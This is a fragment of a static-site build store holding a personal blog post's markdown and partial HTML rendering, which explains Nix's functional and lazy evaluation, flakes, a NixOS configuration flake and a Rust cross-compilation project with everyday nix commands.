Analysis",{"depth":40,"slug":346,"text":347},"analyzing-main__main","Analyzing main__main",{"depth":27,"slug":349,"text":350},"key-1-analyzing-main__one","KEY 1: Analyzing main__one",{"depth":27,"slug":352,"text":353},"key-2-analyzing-main__two","KEY 2: Analyzing main__two",{"depth":27,"slug":355,"text":356},"solution","Solution",{"depth":40,"slug":358,"text":359},"final-keys","Final Keys",{"depth":40,"slug":361,"text":362},"flag-format","Flag Format",[],[],{"title":318,"date":100},[],"nixos-flakes",{"id":367,"data":369,"body":372,"filePath":373,"digest":374,"rendered":375},{"title":370,"date":371},"Provenance and Purity: Nix programming language & Fixed-Output Flakes",["Date","2025-10-02T00:00:00.000Z"],"# Provenance and Purity: Nix programming language & Fixed-Output Flakes\r\n\r\n\r\n\r\n\r\nBefore getting into this , let me explain what functional programming languages are :)\r\n\r\nThe wikepedia quotes  - **functional programming** is a [programming paradigm](https://en.wikipedia.org/wiki/Programming_paradigm \"Programming paradigm\") where programs are constructed by [applying](https://en.wikipedia.org/wiki/Function_application \"Function application\") and [composing](https://en.wikipedia.org/wiki/Function_composition_\\(computer_science\\) \"Function composition (computer science)\") [functions](https://en.wikipedia.org/wiki/Function_\\(computer_science\\) \"Function (computer science)\"). It is a [declarative programming](https://en.wikipedia.org/wiki/Declarative_programming \"Declarative programming\") paradigm in which function definitions are [trees](https://en.wikipedia.org/wiki/Tree_\\(data_structure\\) \"Tree (data structure)\") of [expressions](https://en.wikipedia.org/wiki/Expression_\\(computer_science\\) \"Expression (computer science)\") that map [values](https://en.wikipedia.org/wiki/Value_\\(computer_science\\) \"Value (computer science)\") to other values, rather than a sequence of [imperative](https://en.wikipedia.org/wiki/Imperative_programming \"Imperative programming\") [statements](https://en.wikipedia.org/wiki/Statement_\\(computer_science\\) \"Statement (computer science)\") which update the [running state](https://en.wikipedia.org/wiki/State_\\(computer_science\\) \"State (computer science)\") of the program.\r\n\r\nLet's see that visually , ive written some examples to help understand this better \r\n\r\n\r\nLet me  establish an important notion: **defining components through functions that accept values for their variation points** provides far greater flexibility than approaches where these variation points are bound using **global variables**.\r\n\r\n\r\nImagine we have a library called muffin (YES) , it has several options built it , and one option called \" confict checker\" is enabled . now imagine that this setting is important and it can change semantics . The point is that trying to make is a build with \"conflict-checker\" cannot be substituted by\r\na build without \"confict-checker\" , and vice versa.\r\n\r\n\r\nNow further adding to this lets say i have a component , consisting of two programs, foo and bar, that require the muffin library with and without \"conflict-checker\" respectively .\r\n\r\nIt's very cutesey to model this in a purely functional langauge \r\n\r\nI could just make a function for muffin which does so \r\n\r\n\r\n![](/images/posts/nixos-flakes/1.png)\r\n\r\nWe can now call this function twice with different values, in the derivations of foo and bar\r\nrespectively:\r\n\r\n\r\n\r\n![](/images/posts/nixos-flakes/2.png)\r\n\r\n\r\nMhmm so how do we adress this issue moving forward  ?\r\n\r\n\r\n\r\n\r\nIf the language were a Makefile-like declarative formalism, then\r\n it would be quite hard to implement this example. Makefiles  are a formalism to\r\ndescribe the construction of (small-grained) components. Variability in a component is\r\ntypically expressed by setting variables  globally before invoking `make`. For example, one might write:\r\n\r\n![](/images/posts/nixos-flakes/3.png)\r\n\r\n\r\nA significant challenge with Make is building a component in multiple configurations at the same time. For example, it's not obvious how to build both `foo` and `bar` with their different library variants in a single, clean process \r\n\r\nWhen developers need to do this, they often resort to special workarounds. A common technique is to call `make` multiple times (recursively), passing different flags on each call and manually renaming the output files to avoid conflicts.\r\n\r\nAn imperative scripting language, however, would make this task more straightforward. A script written in that style might look like this\r\n\r\n![](/images/posts/nixos-flakes/4.png)\r\n\r\n\r\nHowever, this imperative approach introduces the same classic problems found in general-purpose scripting. The biggest issue is that the **order of execution is critical**, which makes it difficult to know the exact configuration being passed to a build function like `muffin()` at any given moment.\r\n\r\nWhile you can trace the logic in a trivial example, the complexity quickly becomes unmanageable as the build script grows with more functions, variables, and `if/else` branches. It's important to note that this isn't just a problem with global variables. Even if `conflictChecker` were a property of a `muffin` object, you would still need to track the program's execution step-by-step to understand the object's state when `muffin()` is called, which makes the whole build process hard to reason about :( \r\n\r\n\r\n## Laziness (JIT compilation)\r\n\r\nOk so a way to solve this would be to use a lazy language \r\nA key feature of a **lazy language** is that it only computes a value at the exact moment it's needed. This property is incredibly powerful for a language used to describe software packages and systems. \r\n\r\n\r\n\r\nConsider a typical `flake.nix` (ill explain this on the way but for now think of it as a substitute for a make file ) for a project. You can define a large and varied collection of outputs in that single file, such as:\r\n\r\n- `packages` for a web server and a command-line tool.\r\n  \r\n- `devShells` for your frontend and backend teams.\r\n  \r\n- `nixosConfigurations` for a production server and a local virtual machine.\r\n  \r\n\r\nBecause the language is **lazy**, if you run a command like `nix build .#server`, Nix will **only** evaluate and build that specific server package and its dependencies. It completely ignores the definitions for the command-line tool, the development shells, and the other system configurations, saving a huge amount of time and resources. You can define an entire universe of components without paying the price for anything you don't immediately use\r\n\r\n\r\n![](/images/posts/nixos-flakes/5.png)\r\n\r\nSince the language is **lazy**, the right-hand sides of the attributes will not be evaluated until they are actually needed, if at all.\r\n\r\nFor instance, if we install any specific component from this set, say,\r\n\r\n```\r\nnix-env -i hello\r\n```\r\n\r\nthen only the **hello** value will be evaluated (although it may in turn require other values to be evaluated, such as **stdenv**).\r\n\r\nLaziness also allows greater efficiency if only parts of a complex data structure are needed.\r\n\r\nTake the operation:\r\n\r\n```\r\nnix-env -qa\r\n```\r\n\r\nwhich prints the **name** attribute of all top-level derivations in a Nix expression.\r\n\r\n\r\n\r\n ![](/images/posts/nixos-flakes/6.png)\r\n\r\nLaziness allows arguments to be passed to functions that may not be used is the main idea . \r\n\r\n\r\n\r\n\r\n## NIX FLAKES : ) \r\n\r\n\r\n\r\n A **Nix expression** is code written in the Nix language that describes how to build or configure something, while a **Nix file** is a `.nix` file that contains one or more of these Nix expressions.\r\n\r\nFor example: \r\n\r\n\r\n![](/images/posts/nixos-flakes/8.png)\r\n\r\nThe first line, `{ pkgs ? import \u003Cnixpkgs> {} }:`, defines a function that takes an argument named `pkgs`, which by default is set to the result of importing `\u003Cnixpkgs>`. This gives the expression access to the standard Nix package set, allowing the use of common utilities and build functions. The next expression, `pkgs.stdenv.mkDerivation { ... }`, declares a derivation, which is a build recipe describing how to construct a package. Inside this derivation, the attributes `pname = \"muffin\";` and `version = \"1.0.0\";` specify the package name and version. The `src = ./.;` line indicates that the source files for the package are located in the current directory, i.e., the same directory as the `.nix` file itself. The `buildPhase` section is a shell script that runs during the build process; in this case, it simply creates a file named `muffin.txt` containing the message “Baking a delicious muffin…”.\r\n\r\n\r\nHopefully this muffin example gave an idea about how nix expressions work , just the syntax tho :3 \r\n\r\n## So what the fuck are flakes now ? \r\n\r\n\r\nThe basic idea of flakes isn't that complicated, but it does require a little bit of basic understanding of the nix programming language(try making your own .nix expression adhering to the muffin example the nix error checker is very nice and :) ) . A `flake.nix` file is an attribute set with two attributes called `inputs` and `outputs`. The `inputs` attribute describes the other flakes that you would like to use; things like nixpkgs or home-manager. You have to give it the url where the code for that other flake is, and usually people use GitHub. The `outputs` attribute is a _function_, which is where we really start getting into the nix programming language. Nix will go and fetch all the inputs, load up _their_ `flake.nix` files, and it will call your `outputs` function with all of _their outputs_ as arguments. The outputs of a flake are just whatever its `outputs` function returns, which can be basically anything the flake wants it to be. Finally, nix records exactly which revision was fetched from GitHub in `flake.lock` so that the versions of all your inputs are pinned to the same thing until you manually update the lock file.\r\n\r\nNow, I said that the outputs of a flake can be basically anything you want, but _by convention_, there's a schema that most flakes adhere to. For instance, flakes often include outputs like `packages.x86_64-linux.foo` as the derivation for the `foo` package for `x86_64-linux`. But it's important to understand that _this is a convention_, which the nix CLI uses by default for a lot of commands. The reason I consider this important to understand is because people often assume flakes are some complicated thing, and that therefore flakes somehow change the fundamentals of how nix works and how we use it. They don't. All the flakes feature does is look at the inputs you need, fetch them, and call your outputs function. It's truly that simple. Pretty much everything else that comes up when using flakes is actually just traditional nix, and not flakes-related at all.\r\n\r\n\r\nEnough yapping , lets see an actual flake now which i use for my hyprland ecosystem\r\n\r\n\r\n\r\n\r\nThis flake defines a **NixOS system configuration** using the experimental **flakes system**. At its core, the flake is a self-contained directory that includes a `flake.nix` file, specifying inputs, outputs, and the system it builds. The flake begins with a `description` field, giving a human-readable label for the configuration, in this case `\"My NixOS configuration\"`.\r\n\r\n```nix\r\n{\r\n  description = \"My NixOS configuration\";\r\n\r\n  inputs = {\r\n    nixpkgs.url = \"github:nixos/nixpkgs/nixos-unstable\";\r\n\r\n    caelestia-shell = {\r\n      url = \"github:caelestia-dots/shell\";\r\n      inputs.nixpkgs.follows = \"nixpkgs\";\r\n    };\r\n  };\r\n\r\n  outputs = { self, nixpkgs, caelestia-shell, ... }@inputs:\r\n    let\r\n      system = \"x86_64-linux\";\r\n      pkgs = nixpkgs.legacyPackages.${system};\r\n    in {\r\n      nixosConfigurations.nixos = nixpkgs.lib.nixosSystem {\r\n        inherit system;\r\n\r\n        modules = [\r\n          ./configuration.nix\r\n\r\n          # Inline module to add Caelestia Shell with CLI\r\n          {\r\n            environment.systemPackages = [\r\n              (caelestia-shell.packages.${system}.with-cli)\r\n            ];\r\n          }\r\n        ];\r\n\r\n        specialArgs = { inherit inputs system; };\r\n      };\r\n    };\r\n}\r\n```\r\n\r\n\r\n\r\n\r\nThe `inputs` section declares dependencies required by this flake. It includes `nixpkgs`, referencing the unstable branch of the official NixOS package collection from GitHub. It also includes a custom flake, `caelestia-shell`, which represents a shell environment maintained externally. To ensure consistency, `caelestia-shell` is configured to use the same `nixpkgs` version as the main flake via `inputs.nixpkgs.follows = \"nixpkgs\"`. This prevents version mismatches between package sets when building the system.\r\n\r\nThe `outputs` function defines what this flake produces. It takes all declared inputs and makes them available for use within the flake. Inside `outputs`, the `system` variable is set to `\"x86_64-linux\"`, and `pkgs` is assigned the corresponding `nixpkgs` package set for that system. This allows the flake to reference packages specific to the target architecture during system construction.\r\n\r\nWithin the outputs, a NixOS configuration called `nixos` is defined using `nixpkgs.lib.nixosSystem`. This function builds a fully specified NixOS system. The configuration uses two modules: the main `configuration.nix` file, which contains standard user-defined system settings, and an inline module that adds the Caelestia Shell CLI to `environment.systemPackages`. This ensures that the shell is globally available on the system. The `specialArgs` attribute passes `inputs` and `system` to all modules, allowing modules to reference flake inputs or architecture-specific values if necessary.\r\n\r\n\r\n## Should I use flakes in my project?\r\n\r\n\r\nI think that Nix flakes have some considerable benefits, such as:\r\n\r\n- Convenient pinning of evaluation-time dependencies\r\n- Eliminating pointless rebuilds of code by only including tracked files in builds\r\n- Making Nix code, on average, much more reproducible by pervasive pinning\r\n- Allegedly caching evaluation\r\n- Possibly making Nix easier to learn by reducing the amount of poking at strange attribute sets and general `NIX_PATH` brokenness\r\n\r\n\r\nThe **Nix language**, along with functions and `nixpkgs` utilities, provides a powerful composition primitive. In my experience, these tools are especially useful in **monorepos**, where different parts of a project need to be assembled modularly and flexibly. Functions allow parametrization and reuse, while `nixpkgs` provides a rich set of prebuilt packages and build utilities that make composing systems straightforward.\r\n\r\nWhile **flakes** are a useful entry point for projects and make dependency management, version control integration, and lockfiles easy, they are not always the most practical tool for composing software. In medium-sized projects, locking subproject dependencies can be undesirable, and for very small utilities, writing a separate `flake.nix` feels like unnecessary overhead. In very large projects, like `nixpkgs` itself, managing everything through flakes would make the `flake.nix` file enormous and unwieldy, containing potentially hundreds of thousands of inputs.\r\n\r\nFlakes also have limitations when it comes to **flexible builds**. They provide minimal support for runtime configuration, and customizing builds often requires awkward workarounds like `--override-input`. This means all build variants must either be anticipated ahead of time or implemented using traditional Nix primitives such as functions, overlays, and modules. Flakes are also difficult to use for **cross-compilation**, since there is no straightforward way to specify a target architecture, making constructs like `packages.${system}` unusable in that context.\r\n\r\nBecause of these constraints, even in a flakes-based setup, it is often more effective to rely on **traditional Nix composition primitives** to assemble software both in the small and in the large. A flake can then serve mainly as an **entry point** and a way to fetch dependencies needed for evaluation, while build-time dependencies can be handled through primitives like `pkgs.fetchurl` or `pkgs.fetchFromGitHub`. To expose multiple configurations of a program, it is common to write a lambda that accepts configuration parameters and call it multiple times to produce different outputs. This approach separates configuration capability from specific build definitions, avoiding the need to embed complex logic in the flake itself.\r\n\r\nOne of the most distinctive features of Nix is that it is **Turing complete**. While this can make static analysis difficult, it also provides immense flexibility: packages can be patched programmatically, configurations can be generated dynamically, and arbitrary files can be read and processed at build time. Because Nix is a **functional language**, its fundamental composition primitive is the function. Even constructs like NixOS modules or overlays are functions that can be imported, partially applied, or reused across projects. In practice, modules are usually imported by path rather than generated dynamically, because imports are deduplicated by filename.\r\n\r\n\r\n## `flake.nix` (`default.nix`, `shell.nix`) in project directories\r\n\r\nThese are _developer_ packaging of projects: pinned tool versions, not caring as much about unifying dependencies with the system, etc. To this end, they provide dev shells to work on a project, and are versioned _with_ the project. Additionally they may provide packaging to install a tool separately from nixpkgs.\r\n\r\nThere are a couple of things that make these notable compared to the packaging one might see in nixpkgs:\r\n\r\n- In nixpkgs, more build time is likely tolerated, and there is little desire to do incremental compilation. Import from derivation is also banned from nixpkgs. For these reasons, packaging outside of nixpkgs likely uses different frameworks and other similar tools that reduce the burden of maintaining Nix packaging or speed up rebuilds.\r\n- It's versioned with the software and so more crimes are generally tolerated: one might pin libraries or other such things, and update nixpkgs infrequently.\r\n- They include the tools to _work on_ a project, which may be a superset of the tools required to build it, for example in the case of checked-in generated code or other such things.\r\n- They may include things like checks, post-commit hooks and other project infrastructure.\r\n\r\nShells are just made of environment variables and (without building one at least) don't create a single `bin` folder of all the things in the shell, for instance. Also, since they are made of environment variables, they don't have much ability to perform effects such as managing services or on-disk state.\r\n\r\nUse this for tools specific to one project, such as compilers and libraries for that project. Depending on taste and circumstances, these may or may not be used for language servers. Generally these are not used for providing tools like `git` or `nix` that are expected to be on the system, unless they are required to actually compile the software.\r\n\r\n(Note that for Bad Reasons, `nix-shell -p` is not equivalent to `nix shell`: the latter does not provide a compiler or `stdenv` as would be necessary to build software. The technical reason here is that `nix shell` constructs the shell within C++ code in Nix, whereas `nix-shell -p` is more or less `nix develop` on a questionable string templated expression involving `pkgs.mkShell`)\r\n\r\nTo demonstrate this i've written a  Rust + Nix project with **multi-target cross-compilation and Docker support**\r\n\r\nIn this guide, we’ll learn how to build a **Rust project** using **Nix flakes** with full **multi-target cross-compilation** and **Docker image generation**. Instead of relying on local toolchains or ad-hoc scripts, we’ll declare everything Rust versions, dependencies, targets, and environment inside a single `flake.nix` file. This gives us a fully reproducible, isolated, and declarative setup. By the end, you’ll understand how Nix ensures consistent builds across machines, how it provisions multiple targets like `x86_64-unknown-linux-musl`, `aarch64-unknown-linux-gnu`, and `x86_64-pc-windows-gnu`, and how to package your Rust binary inside a lightweight Docker image all from one flake-based configuration\r\n\r\n\r\n### Why Use Nix Flakes for ANY Projects?\r\n\r\n![](/images/posts/nixos-flakes/Rustflakes.png)\r\n\r\n\r\n\r\nWhen building Rust applications, especially for production or cross-platform distribution, you face several common challenges. Different machines often have different Rust versions installed via `rustup`, leading to toolchain drift. Native libraries like OpenSSL vary wildly across distros, creating system dependency chaos. Setting up Windows or ARM targets requires painful manual linker configuration. Build scripts that work perfectly on your local machine mysteriously break in CI environments, and multi-stage Dockerfiles end up duplicating build logic in confusing ways.\r\n\r\n**Nix Flakes Solution:**\r\n\r\nWith the [Rustflakes](https://github.com/mooofin/Rustflakes) approach, you get a much cleaner solution. One `flake.nix` file becomes your single source of truth, declaring the Rust version, all system dependencies, and build targets in one place. Builds are hermetic—they don't rely on whatever happens to be installed on your host system. Cross-compilation becomes trivial: just add a target to `flake.nix` and run `nix build .#windows` or `.#aarch64`. You even get Docker images for free, generated directly from Nix derivations. Since dependencies are vendored in `vendor/`, builds work offline without network access.\r\n\r\nThis makes Rustflakes particularly valuable for teams needing consistent builds across developer machines and CI, projects targeting multiple platforms like Linux, Windows, and ARM, embedded or IoT applications requiring specific toolchain versions, and security-conscious environments requiring reproducible builds.\r\n\r\nThe repository demonstrates this with working examples for `x86_64-linux`, `aarch64-linux`, and `x86_64-windows` targets, all built from the same declarative configuration.\r\n\r\n\r\n\r\n### Building the Project\r\n\r\nLet's walk through using this Nix-based Rust project:\r\n\r\n\r\n![](/images/posts/nixos-flakes/10.png)\r\n\r\nEntering the environment gives us \r\n\r\n![](/images/posts/nixos-flakes/11.png)\r\n\r\n- If you want to run a simple stand-alone binary just once, use nix run. E.g. `nix run nixpkgs#tree` (the command will have to live in `$out/bin/\u003Cpname>`) (or `meta.mainProgram`, if that exists)\r\n    \r\n- To pass it arguments, use `--` or your flags will be interpreted by `nix run`, not passed to the command. E.g. `nix run nixpkgs#tree -- -a`\r\n    \r\n- To put that in the PATH of your current shell, temporarily, so you can run it a bunch of times today: `nix shell nixpkgs#ffmpeg`. Tip: to enable multiple programs: `nix shell nixpkgs#{ffmpeg,tree,imagemagick}`.\r\n    \r\n- Maybe your desired binary exists in `$out/bin`, but has a different name? This is an odd one: `nix shell nixpkgs#postgresql --command psql ...` (extra odd: you don't need to use `--` to separate program args from nix args.) (I understand the \"why\" behind this, but I hate it. The new `nix` command was supposed to solve the counterintuitive UI problem, but here we are, back to square 1. \r\n    \r\n- Say you want to \"build\" a derivation, you use `nix build`, although if it's available in a binary cache it will just fetch it from there: `nix build nixpkgs#imagemagick`. Now you have it in your `/nix/store`, and a symlink to that path in `./result`.\r\n    \r\n- Sometimes I just want to build something and print the path to stdout, without actually creating a link in `/nix/store`. Combine two flags: `nix build nixpkgs#imagemagick --print-out-paths --no-link`.\r\n    \r\n    - I use that to do stuff like this: `$ nix run nixpkgs#tree -- $(nix build nixpkgs#imagemagick --print-out-paths --no-link)/bin`.\r\n        \r\n    - Or this, on mac: `open $(nix build nixpkgs#grandperspective --print-out-paths --no-link)/Applications/*`\r\n        \r\n    - You can see how `nix run` really is just syntactic sugar for `$(nix build --no-link --print-out-paths \u003Cderiv>)/bin/\u003Cderiv.meta.mainProgram or deriv.pname>` (sort of)\r\n        \r\n\r\nBut my all time favourite is `nix develop`: it plops you in a _build shell_ for a derivation. This means you can pretend you are the nix builder, locally. Including fetching the source!\r\n\r\nE.g., to build sbcl (the lisp compiler) locally, without installing anything else nor even downloading the source, just:\r\n```bash \r\n$ cd $(mktemp -d)\r\n$ nix develop nixpkgs#sbcl\r\n$ unpackPhase\r\n$ cd *\r\n$ patchPhase\r\n$ eval \"$buildPhase\"\r\n$ .... debug problems here...\r\n```\r\nI think this is very neat.\r\n\r\n\r\nSO to summarise \r\n\r\n\r\n- nix shell: alters your shell. Use it when you want to _use_ a package.\r\n    \r\n- nix develop: for _developing_ something. Only use it when you are developing a package.\r\n    \r\n- nix run: one-off running of programs.\r\n    \r\n- nix build: ensure a derivation is available in your /nix/store. Either download or build. Optionally: create symlink in ./result, and/or print the output path to stdout, and/or print build noise to stderr (`--print-build-logs`).\r\n\r\nComing back to the project we can see that muhehe\r\n![](/images/posts/nixos-flakes/12.png)\r\n\r\n![](/images/posts/nixos-flakes/13.png)\r\nLet's break down what the nix approach using flakes solves here , ill adress the main things in packaging \r\n\r\n### 1. Reproducibility\r\n\r\nNormally, if you just run `cargo build`, your binary depends on several local factors: the version of Rust installed on your machine, the versions of system libraries like `libssl` or `libsqlite`, and the state of your local `Cargo.lock`. With Nix, the build becomes fully reproducible. It uses a specific Rust toolchain (nightly in our example), relies on vendored dependencies in the `vendor/` directory, and incorporates all libraries declared in the `flake.nix` dev shell. The result is that anyone on any machine with Nix installed can build the exact same binary, eliminating the common “works on my machine” problems.\r\n\r\n\r\n\r\n### 2. Isolation\r\n\r\nNix builds everything inside a sandbox located in `/nix/store`, which prevents accidental dependencies on files outside the project or on system-installed libraries or Rust versions. This isolation ensures that builds are deterministic and safe, making it ideal for continuous integration and deployment pipelines.\r\n\r\n\r\n\r\n### 3. Cross-compilation\r\n\r\nBuilding for multiple targets such as Linux, ARM, or Windows normally requires installing Rust targets manually and configuring toolchains and linker flags. With Nix, you can declare all your targets in `flake.nix` for example, `x86_64-unknown-linux-musl`, `aarch64-unknown-linux-gnu`, and `x86_64-pc-windows-gnu`. Nix automatically sets up all the required compilers and Rust standard libraries for these targets, making cross-compilation seamless.\r\n\r\n\r\n\r\n### 4. Automation and Declarative Builds\r\n\r\nUsing Nix eliminates the need for manual scripts like `build-all.sh`. Everything is declarative in `flake.nix`: the dev environment is set up automatically with `nix develop`, binary builds happen with `nix build .#default`, and cross-compilation targets are handled automatically. This declarative approach makes your Rust project fully CI/CD-ready with zero surprises.\r\n\r\n\r\n### Wrapping it up \r\n\r\n### A Language for Builders\r\n\r\nWe need to find a better way to write builders. **Shell scripts** are simply not a good language for this purpose. The **Unix shell** is quite good as component glue which is what we use it for but it is not **safe enough**. It is, in fact, virtually impossible to write _“correct”_ shell scripts that do not fail unexpectedly for banal reasons on certain inputs or in certain situations.\r\n\r\n#### Problems with Shell Scripts\r\n\r\nHere are some of the main problems in the language:\r\n\r\n- **Variable interpolation** (e.g., `$foo`) happens by default.  \r\n    This causes most shell scripts to fail on file names that contain spaces or newlines.  \r\n    The same applies to automatic _globbing_ (expansion of special characters such as `*`).\r\n    \r\n- **Undefined variables** do not signal an error.\r\n    \r\n- **Non-zero exit codes** from commands are ignored by default.  \r\n    Worse, it is extremely hard to catch errors from the left-hand sides of pipes.\r\n    \r\n\r\n---\r\n\r\nIn fact, the whole **Unix toolchain** is not conducive to writing correct code:\r\n\r\n- **Command-line arguments** in Unix are usually overloaded.  \r\n    For example, there is an ambiguity in most Unix tools between options and file names starting with a dash.\r\n    \r\n- The **pipe model** assumes that all tools read and write _flat text files_ without a well-defined structure.  \r\n    This makes it hard to extract relevant data in a structured way. Typically, regular expressions in conjunction with tools like `grep`, `sed`, `awk`, and `perl` are used to extract data but this tends to be brittle. The regular expressions hardly ever cover all possibilities.\r\n    \r\n- Similarly, the fact that **options are flat strings** makes it hard to pass structure, necessitating escaping.  \r\n    For instance, the command `grep -q \"$filename\"` to see whether a certain file name occurs in a list fails to account for the fact that `grep` interprets some characters in `$filename` as **regular expression meta-characters**.\r\n\r\n\r\n\r\n---\r\n\r\n### The Problem of Eliminating “Bad” Components in a Purely Functional Model\r\n\r\nWhile the **purely functional model** used by Nix offers strong guarantees of reproducibility and non-interference, it introduces a unique challenge:  \r\nHow can we ensure that all uses of a certain **“bad” component** such as one containing a security vulnerability have been fully eliminated?\r\n\r\nConsider a scenario where a **fundamental dependency**, such as **Zlib**, is discovered to contain a critical security flaw.  \r\nBecause Zlib is widely used by many other components and applications, we must guarantee that **every package** depending on the vulnerable version is replaced with one built against a **patched version**.\r\n\r\nIn principle, we might attempt to update everything using a command like:\r\n\r\n```bash\r\nnix-env -u \"*\"\r\n```\r\n\r\nHowever, this approach is **not guaranteed** to remove all vulnerable components especially if some were installed from **arbitrary third-party sources** outside of **Nixpkgs**.\r\n\r\nThis limitation arises from the very **non-interference property** that makes Nix functional and reproducible: each component is built in isolation, without being globally overwritten or modified in place. While this ensures determinism, it also means that **outdated or insecure builds can persist** if not explicitly replaced.\r\n\r\n---\r\n\r\n### Toward a Solution\r\n\r\nTo address this, the system needs a **generic detection mechanism** that can identify the presence or usage of “bad” components.  \r\nSuch a mechanism would rely on a **blacklist** describing known-vulnerable packages or derivations. The build system could then trace dependency graphs and flag (or prevent) any components that still depend on blacklisted items.\r\n\r\nThis approach ensures that security updates are **systematic and verifiable**, preserving the advantages of the functional model while adding **safety guarantees** against vulnerable dependencies.\r\n\r\n\r\nIn essence, while Nix’s functional model prevents uncontrolled interference, it also prevents automatic global replacement of insecure components. The solution lies in **explicit detection and tracing mechanisms**, guided by a **blacklist**, that can systematically ensure the removal and replacement of all affected packages combining **deterministic builds** with **reliable security assurance**.\r\n\r\n\r\n\r\n### Some honest thoughts \r\n\r\nContrary to popular believe, you don't need to learn the nix language to use nix. From your perspective, nix can be glorified json for configuring your system. There is much more to the programming language that you probably won't ever have to care about.\r\n\r\nI don't think NixOS is intrinsically more work or more complicated than Debian. It can be if you are coming from a traditional distro or if your specific use case is not supported well. E. g. setting up a web server, a firewall or other system components is much easier in NixOS. Getting some random python package working however can be a big pain. If you use popular software you should be good.\r\n\r\nI'd argue using NixOS is more involved at the beginning but gets much less involved after you set things up as generally things don't break. Once in a while you get a deprecation message and may need to adjust your configuration - that's it.\r\n\r\nI find myself however stumbling upon better ways of configuring my system and steadily improving my set up. I believe I wouldn't be doing that on a traditional distro so much because it would be much harder to do these things while keeping state. So if you are a perfectionist or an enthusiast you will probably spend more time just because it's much more fun :3","src/content/blog/nixos-flakes.md","546d3265bbe549c4",{"html":376,"metadata":377},"\u003Ch1 id=\"provenance-and-purity-nix-programming-language--fixed-output-flakes\">Provenance and Purity: Nix programming language &#x26; Fixed-Output Flakes\u003C/h1>\n\u003Cp>Before getting into this , let me explain what functional programming languages are :)\u003C/p>\n\u003Cp>The wikepedia quotes  - \u003Cstrong>functional programming\u003C/strong> is a \u003Ca href=\"https://en.wikipedia.org/wiki/Programming_paradigm\" title=\"Programming paradigm\">programming paradigm\u003C/a> where programs are constructed by \u003Ca href=\"https://en.wikipedia.org/wiki/Function_application\" title=\"Function application\">applying\u003C/a> and \u003Ca href=\"https://en.wikipedia.org/wiki/Function_composition_(computer_science)\" title=\"Function composition (computer science)\">composing\u003C/a> \u003Ca href=\"https://en.wikipedia.org/wiki/Function_(computer_science)\" title=\"Function (computer science)\">functions\u003C/a>. It is a \u003Ca href=\"https://en.wikipedia.org/wiki/Declarative_programming\" title=\"Declarative programming\">declarative programming\u003C/a> paradigm in which function definitions are \u003Ca href=\"https://en.wikipedia.org/wiki/Tree_(data_structure)\" title=\"Tree (data structure)\">trees\u003C/a> of \u003Ca href=\"https://en.wikipedia.org/wiki/Expression_(computer_science)\" title=\"Expression (computer science)\">expressions\u003C/a> that map \u003Ca href=\"https://en.wikipedia.org/wiki/Value_(computer_science)\" title=\"Value (computer science)\">values\u003C/a> to other values, rather than a sequence of \u003Ca href=\"https://en.wikipedia.org/wiki/Imperative_programming\" title=\"Imperative programming\">imperative\u003C/a> \u003Ca href=\"https://en.wikipedia.org/wiki/Statement_(computer_science)\" title=\"Statement (computer science)\">statements\u003C/a> which update the \u003Ca href=\"https://en.wikipedia.org/wiki/State_(computer_science)\" title=\"State (computer science)\">running state\u003C/a> of the program.\u003C/p>\n\u003Cp>Let’s see that visually , ive written some examples to help understand this better\u003C/p>\n\u003Cp>Let me  establish an important notion: \u003Cstrong>defining components through functions that accept values for their variation points\u003C/strong> provides far greater flexibility than approaches where these variation points are bound using \u003Cstrong>global variables\u003C/strong>.\u003C/p>\n\u003Cp>Imagine we have a library called muffin (YES) , it has several options built it , and one option called ” confict checker” is enabled . now imagine that this setting is important and it can change semantics . The point is that trying to make is a build with “conflict-checker” cannot be substituted by\r\na build without “confict-checker” , and vice versa.\u003C/p>\n\u003Cp>Now further adding to this lets say i have a component , consisting of two programs, foo and bar, that require the muffin library with and without “conflict-checker” respectively .\u003C/p>\n\u003Cp>It’s very cutesey to model this in a purely functional langauge\u003C/p>\n\u003Cp>I could just make a function for muffin which does so\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/nixos-flakes/1.png\" alt=\"\">\u003C/p>\n\u003Cp>We can now call this function twice with different values, in the derivations of foo and bar\r\nrespectively:\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/nixos-flakes/2.png\" alt=\"\">\u003C/p>\n\u003Cp>Mhmm so how do we adress this issue moving forward  ?\u003C/p>\n\u003Cp>If the language were a Makefile-like declarative formalism, then\r\nit would be quite hard to implement this example. Makefiles  are a formalism to\r\ndescribe the construction of (small-grained) components. Variability in a component is\r\ntypically expressed by setting variables  globally before invoking \u003Ccode>make\u003C/code>. For example, one might write:\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/nixos-flakes/3.png\" alt=\"\">\u003C/p>\n\u003Cp>A significant challenge with Make is building a component in multiple configurations at the same time. For example, it’s not obvious how to build both \u003Ccode>foo\u003C/code> and \u003Ccode>bar\u003C/code> with their different library variants in a single, clean process\u003C/p>\n\u003Cp>When developers need to do this, they often resort to special workarounds. A common technique is to call \u003Ccode>make\u003C/code> multiple times (recursively), passing different flags on each call and manually renaming the output files to avoid conflicts.\u003C/p>\n\u003Cp>An imperative scripting language, however, would make this task more straightforward. A script written in that style might look like this\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/nixos-flakes/4.png\" alt=\"\">\u003C/p>\n\u003Cp>However, this imperative approach introduces the same classic problems found in general-purpose scripting. The biggest issue is that the \u003Cstrong>order of execution is critical\u003C/strong>, which makes it difficult to know the exact configuration being passed to a build function like \u003Ccode>muffin()\u003C/code> at any given moment.\u003C/p>\n\u003Cp>While you can trace the logic in a trivial example, the complexity quickly becomes unmanageable as the build script grows with more functions, variables, and \u003Ccode>if/else\u003C/code> branches. It’s important to note that this isn’t just a problem with global variables. Even if \u003Ccode>conflictChecker\u003C/code> were a property of a \u003Ccode>muffin\u003C/code> object, you would still need to track the program’s execution step-by-step to understand the object’s state when \u003Ccode>muffin()\u003C/code> is called, which makes the whole build process hard to reason about :(\u003C/p>\n\u003Ch2 id=\"laziness-jit-compilation\">Laziness (JIT compilation)\u003C/h2>\n\u003Cp>Ok so a way to solve this would be to use a lazy language\r\nA key feature of a \u003Cstrong>lazy language\u003C/strong> is that it only computes a value at the exact moment it’s needed. This property is incredibly powerful for a language used to describe software packages and systems.\u003C/p>\n\u003Cp>Consider a typical \u003Ccode>flake.nix\u003C/code> (ill explain this on the way but for now think of it as a substitute for a make file ) for a project. You can define a large and varied collection of outputs in that single file, such as:\u003C/p>\n\u003Cul>\n\u003Cli>\n\u003Cp>\u003Ccode>packages\u003C/code> for a web server and a command-line 